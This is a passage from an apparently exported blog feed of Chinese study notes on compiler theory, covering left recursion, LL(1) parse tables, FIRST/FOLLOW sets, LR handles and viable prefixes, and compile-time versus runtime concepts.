class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">bool <span class="hljs-built_in">S1</span>() &#123; return <span class="hljs-built_in">S</span>() &amp;&amp; <span class="hljs-built_in">term</span>()&#125;<br>bool <span class="hljs-built_in">S</span>() &#123; return <span class="hljs-built_in">S1</span>()&#125;<br></code></pre></td></tr></table></figure><p>如果使用递归下降，会产生如下的调用链条：S =&gt; S1 =&gt; S =&gt; S1=&gt; ...</p><p>这就是左递归语法</p><p>以下是左递归语法更一般的定义： <span class="math display">\[S \mathop{\rightarrow}^+ S\alpha (+表示至少有一次推导)\]</span> 再看这个🌰： <span class="math display">\[S \rightarrow S\alpha | \beta\]</span> 将会产生以<span class="math inline">\(\beta\)</span>开头的且<span class="math inline">\(\beta\)</span>后面紧跟任意数量(&gt;=0)<spanclass="math inline">\(\alpha\)</span>的字符串。</p><p>既然已经知道了会产生什么样的字符串，可以通过把文法改写成右递归避免递归下降产生的左递归问题：<span class="math display">\[S \rightarrow \beta S&#39; \\S&#39; \rightarrow \alpha S&#39; | \epsilon\]</span> Conclusion：</p><p>一般的递归下降是从左到右解析，由于该算法的性质，遇到做递归文法会导致无穷递归；可以通过把左递归文法改成特殊(这里的右递归文法也仅仅适用于部分语法)的右递归文法避免这个问题，因为这个时候非终结符在最右边，不会有右边字符存在一直饥饿(一直访问不到)的现象。</p><p>更一般的，可以改写成如下特殊的右递归文法： <spanclass="math display">\[S&#39; \rightarrow S\alpha_1 | ... | S\alpha_n | \beta_1|...|\beta_m\]</span></p><p><span class="math display">\[S \rightarrow \beta_1 S&#39;| ... | \beta_m S&#39; \\S&#39; \rightarrow \alpha_1 S&#39; | ... | \alpha_nS&#39; | \epsilon\]</span></p><p>但是有些语法，如： <span class="math display">\[S \rightarrow A\alpha | \beta \\A \rightarrow S \beta\]</span> 这个语法也是左递归语法，写成如下形式更好理解： <spanclass="math display">\[S \mathop{\rightarrow}^+ S \beta \alpha\]</span> 可以通过其他方式消除左递归。</p><p>继续top-down</p><h3 id="预测">预测</h3><p>Predicive Parsers like recursive-descent but parser can<strong>"predict"</strong> which production to use:</p><ul><li>By looking at the next few tokens</li><li>No backtracking</li></ul><p>Predicive Parsers accept LL(k) grammars (1st L: left 2 right, 2nd L:left-most derivation, k: k tokens look ahead)</p><p>在递归下降算法里：</p><ul><li>每一步，有很多产生式可以使用，如：E -&gt; T | T | T +E，对于E，有3种选择</li><li>需要通过回溯撤销bad choices</li></ul><p>LL(1):</p><ul><li>通过改写成合适的文法（一般是左因子分解，左因子分解可以理解为公共左因子提取，这里的因子值终结符）每一步，仅有一步选择：</li></ul><blockquote><p>Hint:其实就是根据当前预测字符决定选择使用哪个推导式，而这个预测字符和推导式的关系需要用一张表来记录</p></blockquote><p>继续考虑语法Grammar:</p><p>E -&gt; T | T | T + E</p><p>T -&gt; int | int * T | (E)</p><p>难以产生预测字符：</p><ul><li>对于T，有两个int开头的推导式，所以即使当前有预测字符int，也无法选择哪一个是最优的推导</li><li>对于E，更不容易看出预测字符是什么</li></ul><p>需要左因子语法改写：</p><p>E -&gt; TX</p><p>X -&gt; +E | </p><p>T -&gt; intY | (E)</p><p>Y -&gt; *T | </p><p>根据新语法可以计算得到LL(1) parse table:其中表头为下一个输入的token，每一行是非终结符，单元格里的内容就是当前使用哪个推导式的rfs，这里暂时没有讲如何构造这张表的</p><table><thead><tr class="header"><th></th><th>int</th><th>*</th><th>+</th><th>（</th><th>）</th><th>$</th></tr></thead><tbody><tr class="odd"><td>E</td><td>TX</td><td></td><td></td><td>TX</td><td></td><td></td></tr><tr class="even"><td>X</td><td></td><td></td><td>+E</td><td></td><td><span class="math inline">\(\epsilon\)</span></td><td><span class="math inline">\(\epsilon\)</span></td></tr><tr class="odd"><td>T</td><td>int Y</td><td></td><td></td><td>(E)</td><td></td><td></td></tr><tr class="even"><td>Y</td><td></td><td>*T</td><td><span class="math inline">\(\epsilon\)</span></td><td></td><td><span class="math inline">\(\epsilon\)</span></td><td><span class="math inline">\(\epsilon\)</span></td></tr></tbody></table><p>比如：[Y, +] entry，表示当前非终结符Y，遇到了当前输入token +</p><p>那么Y就可以按照<span class="math inline">\(Y \rightarrow\epsilon\)</span> 推导，</p><p>[E, *] entry，表示当前非终结符X，遇到了当前输入token*，没有合适的推导式可以使用</p><p>这里我们再提一个额外的知识点：</p><p>我们不想采用递归的方式去做解析，而是利用栈解析：</p><ul><li>非终结符仍然是扩展替换的</li><li>终结符也仍然会输入进行比较匹配</li><li>栈顶=最左边的待处理的非终结符或非终结符</li><li>Reject on reaching error state</li><li>Accepy on end of input &amp; empty stack</li></ul><p>形式化定义如下：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">initialize stack = &lt;S $&gt; and <span class="hljs-keyword">next</span><br>repeat<br><span class="hljs-keyword">case</span> stack of<br>&lt;X, rest&gt;: <span class="hljs-keyword">if</span> T[X, *<span class="hljs-keyword">next</span>] = Y1...Yn<br>then stack &lt;- &lt;Y1...Yn rest&gt;;<br><span class="hljs-keyword">else</span> error(); <span class="hljs-comment">// 不存在推导动作则直接报错</span><br>&lt;t, rest&gt;: <span class="hljs-keyword">if</span> t == *<span class="hljs-keyword">next</span>++<br>then stack &lt;- &lt;rest&gt;;<br><span class="hljs-keyword">else</span> error();<br>until stack == &lt;&gt;<br><br>初始化的时候栈顶是其实非终结符S,<br>后续，如果当前栈顶是非终结符X，且根据预测表执行的推导动作是X -&gt; Y1...Yn,则<span class="hljs-keyword">pop</span> X <span class="hljs-keyword">from</span> stack and <span class="hljs-keyword">push</span> Y1...Yn <span class="hljs-keyword">into</span> stack<br>否则：如果栈顶是终结符且和当前输入相同（说明栈顶的这个元素直接可以使用其本身进行推导），则<span class="hljs-keyword">pop</span> t <span class="hljs-keyword">from</span> stack<br></code></pre></td></tr></table></figure><p>看一个🌰：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230619230522565.png"alt="image-20230619230522565" /><figcaption aria-hidden="true">image-20230619230522565</figcaption></figure><h3 id="first">first</h3><h3 id="follow">follow</h3><h3 id="ll1-parse-table">ll1-parse-table</h3><p>构建预测表的步骤：</p><p>For each production <span class="math inline">\(A \rightarrow\alpha\)</span> in G do:</p><ul><li>For each terminal <span class="math inline">\(t \inFirst(\alpha)\)</span> do<ul><li><span class="math inline">\(T[A, t] = \alpha\)</span></li></ul></li><li>If <span class="math inline">\(\epsilon \in First(\alpha)\)</span>for each t $t Follow(A) $ do<ul><li><span class="math inline">\(T[A, t] = \alpha\)</span></li></ul></li><li>If <span class="math inline">\(\epsilon \in First(\alpha)\)</span>and t $$ Follow(A) $ do<ul><li><span class="math inline">\(T[A, t] = \alpha\)</span></li></ul></li></ul><p>First() = { $, ) }</p><p>Follow(X) = { +, $, ) }</p><p>所以上面的语法形成的预测表如下</p><table><thead><tr class="header"><th></th><th>(</th><th>)</th><th>+</th><th>*</th><th>int</th><th>$</th></tr></thead><tbody><tr class="odd"><td>E</td><td>TX</td><td></td><td></td><td></td><td>TX</td><td></td></tr><tr class="even"><td>T</td><td>(E)</td><td></td><td></td><td></td><td>intY</td><td></td></tr><tr class="odd"><td>X</td><td></td><td>+E</td><td></td><td></td><td></td><td><span class="math inline">\(\epsilon\)</span></td></tr><tr class="even"><td>Y</td><td></td><td><span class="math inline">\(\epsilon\)</span></td><td><span class="math inline">\(\epsilon\)</span></td><td>*T</td><td></td><td><span class="math inline">\(\epsilon\)</span></td></tr></tbody></table><p>上述表格每个表格内的条目最多只有一条，当唯恐的时候，表示解析遇到错误，下面看一个表格内不止一个条目的例子：</p><p>语法：<span class="math inline">\(S -&gt; Sa | b\)</span></p><p>First(S) = { b }</p><p>Follow(S) = { $, a }</p><table><thead><tr class="header"><th></th><th>a</th><th>b</th><th>$</th></tr></thead><tbody><tr class="odd"><td>$</td><td>b / Sa</td><td></td><td></td></tr></tbody></table><p>正如上面的例子，如果一个表的内容是多个，则该语法不是LL(1)，当燃判断是否为LL(1)还有其他方法：</p><ul><li>非左因子语法不是LL(1)</li><li>左递归不是LL(1)</li><li>二义性也不是</li><li>其他的，如LL(k), k &gt; 1也不是</li></ul><p><strong>网页知识点：</strong></p><p>LL和LR：</p><p>概念梳理：</p><p>首先说明，Context-freegrammar与无二义性文法不是一个层级的概念。CFG的意思是：我们用产生式设计的一组文法，对于每一个推导，其中的NT可以任意地被产生式右部替换而合法（这并不限制对于一个文本，只能推理出一棵树）。也就是每个NT之下的产生式是等价的，比如对于Verb-&gt;吃/睡/飞，在具体解析时，不论前面的主语/后面的宾语是什么，都合法。二义性是在CFG之下的概念。</p><p><ahref="https://blog.reverberate.org/2013/07/ll-and-lr-parsing-demystified.html">LLand LR Parsing Demystified (reverberate.org)</a></p><p>LL表示从左到右扫描输入并执行最左推导，LL和LR相比哪个适用范围更广呢？</p><p>为简单讨论，我们只讨论LL(1)和LR(1)，1代表向前查看的字符数量（预测1个字符），1表示任何时刻我们提前查看当前输入字符的下一个字符，再根据这个提前查看的字符决定使用哪一个规约行为。</p><ul><li>In LL(1) we see the first symbol of the input and see the productionto apply. So, if there is two productions with the same ‘first’ symbolas in the input parser gets a conflict and fails.</li><li>在LL(1)里，我们自左到右进行规约，查看当前字符和采用对应的推导式进行规约。所以，如果如果有两个推导式有着相同的fiestsymbol，就会产生冲突</li><li>在 LR（1）中，我们看到从左边开始的输入，直到我们得到一个handle。在此之后，我们再看到一个前瞻符号并确定解析器操作.即，解析器比LL（1） 中有更多的信息来决定其操作，这使得它比 LL（1）更强大。更强大的手段是，任何可以被 LL（1） 解析的语法也可以被 LR（1）解析。</li><li>这种情况在更一般的场景下也成立，对于任何k，LL（k）语法集是LR（k）语法集的适当子集</li></ul><p>这里我们所说的解析器的能力指的是其可以解析的语法的范围，并不是说它能够生成的语言。所以什么是LL(1)语言呢，它们是不是都可以被LL(1)生成呢？</p><p>实际上LL(k)的能力和k成正比，k越大，LL(k)的能力越强，LL(k)是LL(k+1)的子集</p><p>那LR(k)?</p><p><span class="math inline">\(First(\alpha)\)</span> 是从<spanclass="math inline">\(\alpha\)</span>推导的handle的起始终结符的集合</p><p><spanclass="math inline">\(Follow(A)\)</span>(这里大写表示A是一个非终结符)，是紧跟在A后面的终结符的集合</p><p>当且仅当一个语法G满足如下条件，G才被称之为LL(1):</p><ol type="1"><li>G not unambiluous</li><li>G not left-recursive</li><li>If there is a production <span class="math inline">\(A→\alpha |\beta\)</span>, then<ol type="1"><li><span class="math inline">\(First(\alpha) \cup First(\beta) =empty\)</span> 否则解析器不知道使用哪个推导式</li><li>if <span class="math inline">\(First(\alpha) \cup First(\beta) =empty\)</span> contains <span class="math inline">\(\epsilon\)</span>,<span class="math inline">\(First(\beta)\)</span>不应该包含<spanclass="math inline">\(\epsilon\)</span>,否则解析器不知道使用哪个推导式</li><li>if <span class="math inline">\(First(\alpha) \cup First(\beta) =empty\)</span>, <span class="math inline">\(First(\beta) \cupFirst(\alpha) = empty\)</span>, 否则解析器不知道使用哪个推导式</li></ol></li></ol><p>下面是LR部分:</p><p>item：文法的一个产生式G加上其右部某一位置的一个点，这个点表示了分析过程中的状态。</p><p>产生式A-&gt;XYZ 产生的四个项：</p><p>A-&gt;·XYZ A-&gt;X·YZ A-&gt;XY·Z A-&gt;XYZ·以第二个项为例，其表示已经接收了一个可以由X推导的串，如果希望能归约，那么接下来要识别一个能够由YZ推导的串。</p><p>Dcfl is a superset of regular. But dcfl with prefix property isnot.</p><h1 id="viable-prefixes-and-handle-in-lr-parsing">Viable Prefixes andHandle in LR Parsing</h1><h3 id="bottom-up-parsing">Bottom-up Parsing</h3><p>Consider the grammar</p><ul><li><span class="math inline">\(S -&gt; XX\)</span></li><li>$X -&gt; aX | b $</li></ul><p>Now, consider a string in <span class="math inline">\(L(S)\)</span>say aabb. We can parse it as follows by left most derivation – replacingthe left most non-terminal in each step, or right most derivation –replacing the rightmost non-terminal in each step.</p><p>考虑一个符合该文法的字符串aabb，我们可以按照最左推导解析它（每一步替换最左边的非终结符）或者也可以按照最右推导解析它（每一步替换最右边的非终结符）</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230619000054295.png"alt="image-20230619000054295" /><figcaption aria-hidden="true">image-20230619000054295</figcaption></figure><p><strong>上面的最右推导被用在bottom-up parsing</strong></p><blockquote><ul><li><em>Any string derivable from the start symbol is a sentential form— it becomes a sentence if it contains only terminals</em></li><li><em>A sentential form that occurs in the leftmost derivation of somesentence is called left-sentential form</em></li><li><em>A sentential form that occurs in the rightmost derivation ofsome sentence is called right-sentential form</em></li></ul></blockquote><p>再次考虑字符串aabb，我们可以按照如下方法解析：</p><p>从左至右扫描输入，如果存在子串匹配任何推导式的<strong>右侧</strong>(RHS,right hand of string), 用该推导式的<strong>左侧</strong>替换该字符串</p><p>具体步骤如下：</p><ol type="1"><li>‘a’ “abb” – 不存在RHS匹配'a'</li><li>‘aa’ “bb” – 不存在RHS匹配'a' 或者 'aa'</li><li>‘aab’ “b” – RHS of <span class="math inline">\(X→b\)</span> matches‘b’ (first b from left) and so we write as</li></ol><p>Consider the string aabb again. We will see a method to parsethis:</p><ol type="1"><li>Scan the input from left to right and see if any substring matchesthe RHS of any production. If so, replace that substring by the LHS ofthe production.</li></ol><p>So, for “aabb” we do as follows</p><ol type="1"><li>‘a’ “abb” – No RHS matches ‘a’</li><li>‘aa’ “bb” – No RHS matches ‘a’ or ‘aa’</li><li>‘aab’ “b” – RHS of <span class="math inline">\(X→b\)</span> matches‘b’ (first b from left) and so we write as aaXb</li><li>‘aaX’ “b” – RHS of <span class="math inline">\(X→aX\)</span> matches“aX” and so we write as</li><li>aXb – Again RHS of <span class="math inline">\(X→aX\)</span> matches“aX” and we get</li><li>Xb – RHS of <span class="math inline">\(X→b\)</span> matches “b” andwe get</li><li>XX – RHS of <span class="math inline">\(S→XX\)</span>matches XX andwe get</li><li>S – the start symbol.</li></ol><p>Now what we did here is nothing but a bottom-up parsing. Bottom-upbecause we started from the string and not from the grammar. Here, weapplied a sequence of reductions, which are as follows: <spanclass="math display">\[aabb → aaXb → aXb → Xb → XX → S\]</span> If we go up and see the Rightmost derivation of the string“aabb”, what we got is the same but in REVERSE order. i.e., our bottomup parsing is doing reverse of the RIGHTMOSTderivation(仔细观察上述的替换过程和最开始的最右推导的顺序是相反的).<strong>So, we can call it an <span class="math inline">\(LR\)</span>parser –$ L$ for scanning the input from Left side and <spanclass="math inline">\(R\)</span> for doing a Rightmostderivation.</strong></p><p>In our parsing we substituted the RHS of a production at each step.This substituted “substring” is called a HANDLE and are shown in<strong>BOLD</strong>below(在推导过程中，我们在每一步替换了子串，这些子串称为Handle，在下面被加粗了).<span class="math display">\[aa\bold bb → a\bold a \bold Xb → \bold a \bold Xb → X\bold b → \bold X\bold X → S\]</span> Formally a handle is defined as (Greek letters used to denotea string of terminals and non-terminals)</p><blockquote><p>"<em>A handle of a right sentential form ‘</em>γ<em>’</em>(γ=αδβ<em>) is a production</em> E→δ <em>and a position in</em> γ<em>where</em> δ <em>can be found and substituted by</em> E <em>to getthe</em> <strong>previous step</strong> <em>in the right most derivationof</em> γ <em>— previous and not “next” because we are doing rightmostderivation in REVERSE. Handle can be given as a production or just theRHS of a production.</em></p></blockquote><p>The handle is not necessarily starting from the left most position asclear from the above example(从上面的例子可以看到handle不一定开始于RHS的最左边). There is importanceto the input string which occurs to the left of the handle(所谓的可行前缀就是当前handle的所有前缀). For example for the handles of“aabb”, we can have the following set of prefixes</p><table><tbody><tr class="odd"><td>aa<strong>b</strong>b</td><td>{a, aa, aab}</td></tr><tr class="even"><td>aa<strong>X</strong>b</td><td>{a, aa, aaX}</td></tr><tr class="odd"><td>a<strong>X</strong>b</td><td>{a, aX}</td></tr><tr class="even"><td>X<strong>b</strong></td><td>{X, Xb}</td></tr><tr class="odd"><td><strong>XX</strong></td><td>{X, XX}</td></tr></tbody></table><p>These set of prefixes are called Viable Prefixes(这些前缀集合被称为可行前缀). Formally</p><blockquote><p>" Viable prefixes are the prefixes of right sentential forms that donot extend beyond the end of its handle.</p><p>i.e., a viable prefix either has no handle or just one possiblehandle on the extreme RIGHT which can be reduced.</p></blockquote><p>We will see later that viable prefixes can also be defined as the setof prefixes of the right-sentential form that can appear on the stack ofa shift-reduce parser. Also, the set of all viable prefixes of the rightsentential forms of a grammar is a REGULAR LANGUAGE. i.e., viableprefixes can be recognized by using a FINITE AUTOMATA. Using this FINITEAUTOMATA and a stack we get the power of a Push Down Automata and thatis how we can parse context-free languages.</p><p>在后面，可行前缀也可以被定义为出现在shift-reduce解析器的最右推导式的前缀集合。当然，所有的可行前缀是正则语言，所以，可行前缀可以被有限自动机识别。使用有限自动机和stack就可以PushDown Automata，这本质上就是在解析上下无关文法。</p><p><strong>参考文献</strong>：https://web.stanford.edu/class/archive/cs/cs143/cs143.1128/handouts/100%20Bottom-Up%20Parsing.pdf</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 12 Conclusion</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%BA%8C/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<p>运行时和编译时的划分及概念（广义和狭义）？</p><p>compile: The instructions or <strong>source code written usinghigh-level language is required to get converted to machine code for acomputer to understand.</strong> During compile time, the source code istranslated to a byte code like from <ahref="https://www.baeldung.com/java-classes-objects">.java to.class</a>. During compile time the compiler check for the syntax,semantic, and type of the code.</p><h3 id="inputs-and-outputs">Inputs and Outputs</h3><p>Inputs and outputs during compile time are the following:</p><ul><li><strong>Inputs –</strong> Source code, dependent files, interfaces,libraries required for successful compilation of the code</li><li><strong>Outputs –</strong> On successful compilation, a compliedcode (<ahref="https://www.sciencedirect.com/topics/computer-science/assembly-code">assemblycode</a> or <ahref="https://www.cs.tufts.edu/comp/40/calendar/lectures/05-CompilationSteps.pdf">relocatableobject code</a>), otherwise <ahref="https://student.cs.uwaterloo.ca/~cs133/Resources/Java/Debugging/compile.shtml">compiletime error</a> messages</li></ul><p>Errors: <strong>During compile time errors occur because of syntaxand semantic.</strong> The syntax error occurs because of the wrongsyntax of the written code. Semantic errors occur in reference tovariable, function, type declarations and type checking.</p><p>简单来说，就是把源代码编译成计算器可以理解的语言，就是编译，注意这里计算机可以理解的语言不一定是汇编和机器码什么的，也可以是与特定操作系统无关的中间语言(字节码)，这个时候可以把这些执行字节码的解释器或者虚拟机理解一个小型的操作系统。</p><p>Runtime:</p><p><strong>A program’s life cycle is a runtime when the program is inexecution.</strong> Following are the different types of runtimeerrors:</p><ul><li><strong>Division by zero</strong> – when a number is divided by zero(0)</li><li><strong>Dereferencing a null pointer</strong> – when a programattempts to access memory with a NULL</li><li><strong>Running out of memory</strong> – when a computer has nomemory to allocate to programs</li></ul><figure><imgsrc="https://www.baeldung.com/wp-content/ql-cache/quicklatex.com-25c5794ab97de69a698576bf136da63a_l3.svg"alt="Rendered by QuickLaTeX.com" /><figcaption aria-hidden="true">Rendered by QuickLaTeX.com</figcaption></figure><p>静态作用域和动态作用域的实现有什么不同？</p><p>静态类型检查和动态类型检查:</p><p>首先得先明确什么是编译时什么是运行时，</p><p>一般的运行时表示从上至下执行汇编代码，但还有些运行时包含中间代码执行时的运行时，举个例子：</p><p>Python =&gt; (编译) pyc(中间代码文件) =&gt; (解释器解释执行) 结果</p><p>这里的pyc =&gt;结果就是运行时，这一步其实包含了把中间代码转为汇编or机器指令的过程，以及优化和类型检查，垃圾回收等，但其实用户感知不到这些过程，感觉好像字节码直接被运行了，所以这些也被包含在运行时里，</p><p>思考：编译+AI优化？</p><p>上下有关文法的理解，什么语言会用上下有关文法，上下无关文vs上下有关文法的比较，各有什么特点</p><p>题主的主要疑惑应该在于：什么是上下文，上下文在哪里？为什么说这个文法上下文无关？</p><p>答案就是：在应用一个产生式进行推导时，前后已经推导出的部分结果就是上下文。上下文无关的意思的，只要文法的定义里有某个产生式，不管一个<ahref="https://www.zhihu.com/search?q=非终结符&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">非终结符</a>前后的串是什么，就可以应用相应的产生式进行推导。（从形式上来看，就是产生式的左边都是单独一个非终结符，即形如S-&gt; ...，而不是非终结符左右还有别的东西，例如 aSb -&gt; ...）</p><p>作者：Quokka链接：https://www.zhihu.com/question/21833944/answer/307309365来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>这么描述有点儿抽象，我举一个<ahref="https://www.zhihu.com/search?q=自然语言&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">自然语言</a>的例子：</p><p><strong><ahref="https://www.zhihu.com/search?q=上下文无关文法&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">上下文无关文法</a>：</strong></p><p>产生式：</p><p>Sent -&gt; S V O</p><p>S -&gt; 人 | 天</p><p>V -&gt; 吃 | 下</p><p>O -&gt; 雨 | 雪 | 饭 | 肉</p><p>其中英文字母都是非终结符（SVO 分别表示<ahref="https://www.zhihu.com/search?q=主谓宾&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">主谓宾</a>），汉字都是终结符。</p><p>这个文法可以生成如下句子（共 2<em>2</em>4=16种组合，懒得写全了，简单写 7 种意思意思）：</p><p>｛人吃饭，天下雨，人吃肉，天下雪，人下雪，天下饭，天吃肉，……｝</p><p>可以看到，其中有一些搭配在语义上是不恰当的，例如“天吃肉”。其（最左）推导过程为：</p><p>Sent -&gt; SVO -&gt; <ahref="https://www.zhihu.com/search?q=天VO&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">天VO</a>-&gt; 天吃O -&gt; 天吃肉</p><p>但是上下文无关文法里，因为有“V -&gt; 吃 | 下”这样一条产生式，V就永远都可以推出“吃”这个词，它并不在乎应用“V -&gt; 吃 |下”这个产生式进行推导时 V 所在的上下文（在这个例子里，就是”天VO“中 V左右两边的字符串”天“和”O“）。事实上，在 V推出“吃”这一步，它的左边是“天”这个词，而”天“和”吃“不搭配，导致最后的句子读起来很奇怪。</p><p>那<strong><ahref="https://www.zhihu.com/search?q=上下文有关文法&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">上下文有关文法</a></strong>呢？产生式可以定义为（其中前两条产生式仍是上下文无关的，后四条则是上下文有关的）：</p><p>Sent -&gt; S V O</p><p>S -&gt; 人 | 天</p><p>人V -&gt; 人吃</p><p>天V -&gt; 天下</p><p>下O -&gt; 下雨 | 下雪</p><p>吃O -&gt; 吃饭 | 吃肉</p><p>可以看到，这里对 V 的推导过程施加了约束：虽然 V还是能推出”吃“和”下“两个词，但是仅仅当 V左边是”人“时，才允许它推导出”吃“；而当 V左边是”天“时，允许它推导出”下“。这样通过上下文的约束，就保证了主谓搭配的一致性。类似地，包含O 的产生式也约束了动宾搭配的一致性。</p><p>这样一来，这个语言包含的句子就只有｛<ahref="https://www.zhihu.com/search?q=人吃饭，天下雨，人吃肉，天下雪&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">人吃饭，天下雨，人吃肉，天下雪</a>｝这四条，都是语义上合理的。</p><p>以”人吃饭“为例，推导过程为：</p><p>Sent -&gt; SVO -&gt; <ahref="https://www.zhihu.com/search?q=人VO&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A307309365%7D">人VO</a>-&gt; 人吃O -&gt; 人吃饭</p><p>其中第三步推导是这样的：非终结符 V 的上文是“人”，因此可以应用“人V-&gt; 人吃”这条产生式，得到“人VO -&gt; 人吃O”。第四步也类似。</p><p>而</p><p><ahref="http://www.zhihu.com/people/20529960b7c64153695a7488fb49aeab"><spanclass="citation" data-cites="范彬">@范彬</span></a></p><p>回答的是语法的歧义性，这和 CFG 无关。最简单的例子：</p><p>假设有如下上下文无关文法：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coq">S -&gt; S1 | <span class="hljs-type">S2</span><br>S1 -&gt; ab<br>S2 -&gt; AB<br>A -&gt; a<br>B -&gt; b<br></code></pre></td></tr></table></figure><p>那么对于 "ab" 这个串，一种推倒方式是 S -&gt; S1 -&gt; ab，另一种是 S-&gt; S2 -&gt; AB -&gt; aB -&gt; ab。前一种要把 "ab"合起来，后一种要分开，这只是说明该文法有歧义，而不能说这是一个上下文有关文法。事实上，还有一些上下文无关语言是固有歧义的（能产生该语言的每一种上下文无关文法都有歧义）。</p><p>上下文无关文法就是说这个文法中<strong>所有的产生式左边只有一个非终结符</strong>，比如：</p><p>S -&gt; aSb</p><p>S -&gt; ab</p><p>这个文法有两个产生式，每个产生式左边只有一个非终结符S，这就是上下文无关文法，因为你只要找到符合产生式右边的串，就可以把它归约为对应的非终结符。</p><p>比如：</p><p>aSb -&gt; aaSbb</p><p>S -&gt; ab</p><p>这就是上下文相关文法，因为它的第一个产生式左边有不止一个符号，所以你在匹配这个产生式中的S的时候必需确保这个S有正确的“上下文”，也就是左边的a和右边的b，所以叫上下文相关文法</p><p>在替换的时候，不是直接替换，还要考虑左边符号的左右环境</p><p>现代编译器和字节码？</p><p>typescript？</p><p>编译的概念是什么？</p><p>为什么正则语言不能用于文法解析？因为正则语言无法处理递归的嵌套结构，不信你用正则写一个嵌套任意层级的if-else试试？</p><p>为什么要有空转换：A -&gt; epsilon ?主要是未来消耗某个非终结符哈，以预测一个字符为例：</p><p>T[E, t] = a,t是一个预测字符，<strong>有一个特殊的情况，epsilon用于消耗某个非终结符</strong>，如X-&gt; E | epsilon</p><p>LL和LR差异</p><p>什么是LL(1),是语言还是解析器？其性质是什么，什么样的文法才是LL(1)</p><p>如何避免左递归</p><p>名次辨识：语言，语法，production， item，viableprefix，handle，解析器</p><p>LL1指的是文法</p><p>language:</p><p>grammar</p><p>Production:</p><p>Handle:句柄（handle）是一个来自编译原理的术语，指的是一个句子中最先被规约的部分，所以带有一个「句」字。</p><p>Viable prefix:</p><p>Parser:</p><p>Item:</p><p><a href="https://www.zhihu.com/question/20607178">(2 封私信 / 34条消息) 运行时（runtime）是什么意思？应该怎样深入且直观地理解？ - 知乎(zhihu.com)</a></p><p>运行时库不仅包含include的，也包含编译器自动插入的；</p><p>https://zhuanlan.zhihu.com/p/71718231</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 4 Parsing Analysis 2 (LR Analysis)</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%9B%9B/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<p>WIP</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Network-CS144 の 1 Introduction</title>
    <link href="/emocoder/2023/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%80/"/>
    <url>/emocoder/2023/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>网络应用：</p><ul><li>基于网络读取和写数据</li><li>常见通信模型：双向的可靠的字节流（为什么是字节流）<ul><li>通信双方一边写入数据，一变读取数据</li><li>可靠的（除非连接中断）</li></ul></li></ul><h2 id="四层网络模型">四层网络模型</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs 